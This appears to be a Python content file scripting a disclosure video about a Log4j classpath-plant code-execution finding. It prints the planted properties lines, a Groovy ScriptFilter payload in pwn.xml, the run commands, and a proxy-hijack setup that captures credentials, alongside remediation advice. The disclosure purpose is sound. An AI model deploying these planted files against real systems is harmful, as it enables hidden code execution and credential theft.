"""Content for the POC video: narration plus the visual spec for every scene.

Each scene is a dict:
    id        unique name
    kind      which renderer draws it (see build.py)
    chapter   small label in the top-left chrome
    narration list of sentences; one TTS clip per sentence, captions come from these
    lead/tail seconds of padding around the narration

Nothing here talks to the filesystem: the terminal scenes pull real output captured
from lab/ at build time, so the footage in the video is the footage the lab prints.
"""

TITLE = "Two text files. One classpath. Full code execution."
SUBTITLE = "Apache Log4j silently applies fixed-name classpath resources — and lets an attacker take over the JVM"
REPO = "github.com/vindeckyy/log4j-classpath-plant-rce"

SCENES = [
    # ------------------------------------------------------------------ cold open
    dict(
        id="cold-open",
        kind="title",
        chapter="",
        narration=[
            "Two text files. One classpath. Full code execution inside a Java application that never asked for it.",
            "This is a finding in Apache Log4j, the logging library that sits inside a large part of the Java ecosystem. It affects the current release. The proof of concept, the full analysis and the disclosure record are public at github{ dot }com{ slash }vindeckyy{ slash }log4j{ dash }classpath{ dash }plant{ dash }rce.",
        ],
        lead=1.2,
        tail=1.0,
    ),
    # ------------------------------------------------------------------ background
    dict(
        id="what-is-log4j",
        kind="concept",
        chapter="Background",
        narration=[
            "Quick background, for people who do not work with Java every day.",
            "Log4j is a logging library. Applications use it to write lines into their log files: user logged in, request failed, payment declined. It runs inside the application process, so it is trusted code.",
            "A Java application finds its code through the classpath: a list of jars and folders the runtime searches. Log4j lives there too, and it starts as soon as the application logs its first line.",
        ],
        lead=0.4,
        tail=0.5,
    ),
    # ------------------------------------------------------------------ the two files
    dict(
        id="two-files",
        kind="files",
        chapter="The mechanism",
        narration=[
            "Here is the first half of the problem. When Log4j starts, it looks for two specific file names on the classpath: log4j2{ dot }system{ dot }properties, and log4j2{ dot }component{ dot }properties.",
            "If it finds them, it obeys them. Every key of the first file is copied into the JVM's system properties, which means global settings for the whole process. The second file configures Log4j itself, including which configuration file to load and which scripting languages are allowed.",
            "Neither file has to be requested. Neither has to be enabled. And measured: Log4j prints no warning at all when it finds them.",
        ],
        lead=0.4,
        tail=0.5,
    ),
    # ------------------------------------------------------------------ the payload file
    dict(
        id="planted-file",
        kind="code",
        chapter="The mechanism",
        file="log4j2.system.properties",
        code=[
            ("# Planted by the attacker on the victim's classpath.", "comment"),
            ("lab.planted=planted-by-attacker", "plain"),
            ("", "plain"),
            ("# Point Log4j at the attacker's configuration.", "comment"),
            ("log4j.configurationFile=pwn.xml", "key"),
            ("log4j2.configurationFile=pwn.xml", "key"),
            ("", "plain"),
            ("# Turn on script execution, which is off by default.", "comment"),
            ("log4j2.Script.enableLanguages=Groovy", "key"),
        ],
        annotations=[
            (4, "This line picks the attacker's configuration file.\nIt can point at a resource inside the very same jar.", "right"),
            (8, "This line enables scripting, which is off by default.\nThat is the execution path.", "right"),
        ],
        narration=[
            "This is the entire attack payload. Four meaningful lines in a plain text file.",
            "One line points Log4j at a different configuration file: the attacker's, named pwn{ dot }xml. The value can name a resource inside the very same jar.",
            "One more line enables scripting, which is off by default: log4j2{ dot }Script{ dot }enableLanguages equals Groovy.",
            "That is all of it. No exploit string, no obfuscation, no reflection tricks.",
        ],
        lead=0.4,
        tail=0.5,
    ),
    # ------------------------------------------------------------------ payload config
    dict(
        id="payload-config",
        kind="code",
        chapter="The mechanism",
        file="pwn.xml",
        code=[
            ('<Configuration status="WARN" name="attacker">', "tag"),
            ("  <Filters>", "tag"),
            ('    <ScriptFilter onMatch="NEUTRAL" onMismatch="NEUTRAL">', "tag"),
            ('      <Script language="groovy"', "tag"),
            ("        scriptText=\"def proc = 'id'.execute();", "key"),
            ("        ... writes /tmp/log4j-lab-pwned.txt ...\"/>", "key"),
            ("    </ScriptFilter>", "tag"),
            ("  </Filters>", "tag"),
            ("</Configuration>", "tag"),
        ],
        annotations=[
            (2, "A normal Log4j configuration with one filter:\na ScriptFilter that runs a Groovy script.", "right"),
            (4, "In this lab it runs id and writes a proof file.\nIn a real attack: a shell, a stealer, ransomware.", "right"),
        ],
        narration=[
            "And the configuration it points at is a normal Log4j configuration file with a single filter: a ScriptFilter that runs a Groovy script.",
            "In this lab, the script runs id and writes a proof file. In a real attack, that script would be a reverse shell, a credential stealer, or ransomware.",
            "So the chain is: planted file, then planted configuration, then attacker's code, all inside the victim's JVM.",
        ],
        lead=0.4,
        tail=0.5,
    ),
    # ------------------------------------------------------------------ demo 1
    dict(
        id="demo-rce",
        kind="terminal",
        chapter="Proof of concept",
        footer="Victim app: lab.ClasspathPoison — an ordinary app with no Log4j configuration of its own",
        steps=[
            dict(
                cmd="CP=lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lib/groovy*.jar",
                note="The victim's classpath.",
                no_output=True,
            ),
            dict(cmd="java -cp \"$CP:lab/build/victim:lab/poison\" lab.ClasspathPoison",
                 note="One extra folder on the classpath — the folder where the attacker dropped the two files."),
        ],
        footage="victim_poison",
        narration=[
            "Now watch it work. This is an ordinary Java application. It has no Log4j configuration of its own. It prints one line, and then makes its first log call.",
            "The classpath is the usual Log4j jars, plus one folder: the folder where the attacker dropped the two files.",
            "And the attacker's code executes inside the victim JVM.",
        ],
        lead=0.5,
        tail=0.4,
    ),
    dict(
        id="demo-order",
        kind="terminal",
        chapter="Proof of concept",
        steps=[],
        footage="victim_poison",
        replay=True,
        callouts=[
            ("The attacker's code, running inside the victim JVM.", 1.3),
            ("The application's own first log line — after the payload.", 2.6),
        ],
        narration=[
            "Look at the order. The attacker's output printed first. The application's own first log line came after it.",
            "Log4j initialised during that first log call, found the planted file, hijacked the configuration, and ran the script before the message was even rendered. The application never got a chance to notice.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ negative control
    dict(
        id="negative-control",
        kind="terminal",
        chapter="Proof of concept",
        footer="Same application, same jars — one folder removed from the classpath",
        steps=[
            dict(cmd="java -cp \"$CP:lab/build/victim\" lab.ClasspathPoison",
                 note="The planted folder is gone. Nothing else changed."),
        ],
        footage="victim_clean",
        narration=[
            "To be sure this is not the lab's fault: the same application, without the planted file. Nothing happens. No property is set, no configuration is hijacked, no code runs.",
            "The only difference between those two runs is one file.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ api only
    dict(
        id="api-only",
        kind="terminal",
        chapter="Blast radius",
        footer="log4j-api only — no log4j-core, no appender, no configuration",
        steps=[
            dict(cmd="java -cp \"lib/log4j-api-2.26.1.jar:lab/build/victim:lab/poison\" lab.ApiOnly",
                 note="A lot of applications never configure Log4j at all. They just have it on the classpath."),
        ],
        footage="api_only",
        narration=[
            "Second surprise: the attack does not need Log4j's core. A large number of applications only have log4j-api, the thin layer, on the classpath, and never configure logging.",
            "With only the API, Log4j says it could not find a logging provider, and carries on. But the planted file still rewrote the JVM's system properties.",
            "So the exposed population is every application with Log4j on its classpath — not only the ones that configured it.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ supply chain
    dict(
        id="supply-chain",
        kind="terminal",
        chapter="Blast radius",
        footer="The same two files, packaged inside a dependency jar",
        steps=[
            dict(cmd="unzip -l lab/build/evil-dependency.jar",
                 note="The planted resource travels inside an ordinary dependency."),
            dict(cmd="java -cp \"$CP:lab/build/victim:lab/build/evil-dependency.jar\" lab.ClasspathPoison",
                 note="The victim depends on the artifact. The artifact carries the payload."),
        ],
        footage="jar_run",
        narration=[
            "Third: the file does not have to sit loose in a directory. It can travel inside a dependency jar.",
            "Here the same planted file was packaged into a jar the victim depends on. The victim runs with that jar on the classpath, and the code executes again.",
            "That turns it into a supply-chain attack. The artifact is delivered by the normal release process, to every environment that consumes it.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ proxy
    dict(
        id="proxy",
        kind="terminal",
        chapter="Blast radius",
        footer="Planted: http.proxyHost=127.0.0.1, http.proxyPort=8899 — the attacker's proxy",
        steps=[
            dict(cmd="python3 lab/proxy_capture.py \\",
                 note="The attacker's proxy starts on 127.0.0.1:8899.",
                 no_output=True),
            dict(cmd="  java -cp \"$CP:lab/build/victim:lab/poison-proxy\" lab.ProxyVictim",
                 note="The victim makes one ordinary outbound request."),
        ],
        footage="proxy",
        narration=[
            "And this is where it stops being a lab trick. Because the planted file sets JVM system properties, it reaches far beyond logging. Here the attacker planted the proxy host and proxy port.",
            "The victim then made one ordinary outbound request, and it went to the attacker's proxy instead. The attacker captured it, including the credentials in the URL.",
            "The same mechanism reaches the application's TLS trust store as well, so outbound HTTPS could be intercepted too. That last part is analysis, not measured here.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ why dangerous
    dict(
        id="why",
        kind="bullets",
        chapter="Why it matters",
        items=[
            ("No attacker data at all",
             "In Log4Shell the attacker had to put a string into a request that reached a log statement. Here the file is the attack. Nothing has to be sent to the victim."),
            ("It is not patched",
             "Log4Shell was fixed in 2.17.1. This affects 2.26.1, the current release, and the same mechanism is in the 3.x API source."),
            ("It is silent",
             "No warning, no log line. And the attacker's configuration replaces the victim's, so the attacker also picks the log level and the log destination. The trail is under their control."),
            ("It survives restarts and redeploys",
             "The file is part of the artifact, so the normal release process carries it to every environment, and it is applied again on every start-up."),
            ("The precondition is a write primitive",
             "A writable classpath entry, or control of one dependency. That is why the base CVSS is 7.8 and not 10 — the access condition is the score."),
        ],
        narration=[
            "So, why is this dangerous.",
            "One: no attacker-controlled data is needed. In Log4Shell the attacker had to get a string into a request that reached a log statement. Here, the file is the attack. Nothing has to be sent to the victim.",
            "Two: it is not patched. Log4Shell was fixed in 2.17.1. This affects 2.26.1, the current release, and the same mechanism is present in the 3.x API source.",
            "Three: it is silent. No warning, no log line. Worse, the attacker's configuration replaces the victim's, so the attacker also chooses the log level and the log destination. The trail is under their control.",
            "Four: it survives restarts and redeploys, because the file is part of the artifact.",
            "And five, the honest part: the attacker needs a writable classpath entry, or control of one dependency. That is the access condition, and it is why the base CVSS score is 7.8, not 10.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ comparison
    dict(
        id="comparison",
        kind="table",
        chapter="Comparison",
        headers=["", "Log4Shell (CVE-2021-44228)", "This finding"],
        rows=[
            ["Vulnerable version required", "yes — fixed in 2.17.1", "no — current release affected"],
            ["Attacker data must reach the logs", "yes", "no"],
            ["Needs a feature to be enabled", "no", "no — the file enables it"],
            ["Affects apps with only log4j-api", "no", "yes"],
            ["Leaves a trace in the logs", "often", "no — the attacker owns the logs"],
            ["Needs the victim to do something", "send a request", "no"],
            ["Delivery", "a string in a request", "a file on the classpath"],
        ],
        narration=[
            "Side by side with Log4Shell, for the checklist people already have in their heads.",
            "Log4Shell needed a vulnerable version, attacker data in the log path, and a victim action. This needs none of that. The current release is affected, no request has to be sent, and the attacker's own configuration decides what the logs say.",
            "If your exposure review says we patched Log4Shell, this finding is still open for you.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ reach
    dict(
        id="reach",
        kind="diagram",
        chapter="Reach",
        narration=[
            "One more thing about reach, and this is analysis rather than a measured compromise. The file is applied by every application that loads it, not by one application.",
            "A single file in a shared deployment directory, a build workspace, or a dependency reaches staging, production, every region and every replica at once. The attacker does not have to find the application, guess a URL, or be lucky with timing.",
            "That is why the classpath, and not the application, is the thing to audit.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ remediation
    dict(
        id="remediation",
        kind="bullets",
        chapter="What to do now",
        items=[
            ("Audit every classpath",
             "Every deployment directory, every container image, every jar in every artifact. Look for log4j2.system.properties and log4j2.component.properties. A match is an incident, not a finding."),
            ("Remove, then rebuild and redeploy",
             "Deleting the file from a running host is not enough — the next deploy brings it back. The artifacts that contained it have to be rebuilt."),
            ("Make the classpath a trust boundary",
             "Nothing on it writable by another account. Verify jars by checksum in CI, and verify the contents of the build workspace before packaging."),
            ("Keep scripting disabled",
             "It is the execution path the plant uses. With no scripting engine on the classpath, the chain fails closed."),
            ("Fix upstream",
             "Log4j should not silently promote a classpath resource into JVM system properties. At minimum: opt-in, a StatusLogger warning when either file is found, and no configuration location taken from a classpath resource."),
        ],
        narration=[
            "What to do now.",
            "Audit every classpath: deployment directories, container images, every jar in every artifact. A match for either file name is an incident, not a finding.",
            "Remove them, then rebuild and redeploy the artifacts that contained them. Deleting the file from a running host is not enough — the next deploy brings it back.",
            "Make the classpath a trust boundary. Nothing on it writable by another account, jars verified by checksum in CI, and the build workspace contents verified before packaging.",
            "Keep scripting disabled. It is the execution path the plant uses, and without a scripting engine the chain fails closed.",
            "And upstream: Log4j should not silently promote a classpath resource into JVM system properties. At minimum, opt in, warn through the StatusLogger when either file is found, and refuse to take the configuration location from a classpath resource.",
        ],
        lead=0.4,
        tail=0.4,
    ),
    # ------------------------------------------------------------------ closing
    dict(
        id="closing",
        kind="closing",
        chapter="Disclosure",
        narration=[
            "This is a first disclosure. The finding has not been sent to any vendor or third party; the report text is published in the repository and goes to the Apache Logging Services security team, security{ at }apache{ dot }org, under the project's ninety day process.",
            "It was found in the same audit as a second Log4j finding, on configuration time evaluation of thread context data. Both are reported together, on one timeline, and both repositories are public.",
            "If you run Log4j, forward the report. The full analysis, the reproduction steps, the detection script and the disclosure record are at github{ dot }com{ slash }vindeckyy{ slash }log4j{ dash }classpath{ dash }plant{ dash }rce.",
        ],
        lead=0.6,
        tail=1.2,
    ),
]
